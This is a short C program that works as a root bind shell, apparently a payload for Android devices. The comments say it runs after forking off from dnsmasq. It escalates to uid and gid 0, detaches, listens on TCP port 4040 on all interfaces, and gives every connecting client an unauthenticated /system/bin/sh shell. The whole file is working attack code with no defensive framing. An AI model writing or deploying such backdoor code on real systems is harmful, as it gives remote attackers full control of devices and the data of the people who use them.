#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

#define PORT 4040

int main()
{
	int newfd, sockfd;
	struct sockaddr_in saddr;

	// setuid/gid to root
	seteuid(0);
	setuid(0);
	setegid(0);
	setgid(0);

	// fork off from dnsmasq
  	if(fork())
    	return 0;

	// create socket that listens on PORT
    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		return 0;
	
	// not sure if this is necesary, but it definitely won't hurt.
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const void *)1, sizeof(const void *));

	// clear out the socket and bind to 0.0.0.0:PORT
	memset(&saddr,0,sizeof(saddr));
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(PORT);
	saddr.sin_addr.s_addr = INADDR_ANY;
	bind(sockfd, (struct sockaddr *)&saddr, sizeof(saddr));
	listen(sockfd, 0);

	// accept loop
	while(1) {
		if((newfd = accept(sockfd, NULL, NULL)) < 0)
			return 0;

		if( !fork() ) { // fork child shell
			dup2(newfd, 2);
			dup2(newfd, 1);
			dup2(newfd, 0);
			execl("/system/bin/sh", "/system/bin/sh", NULL);
		}
	}

	return 0;
}
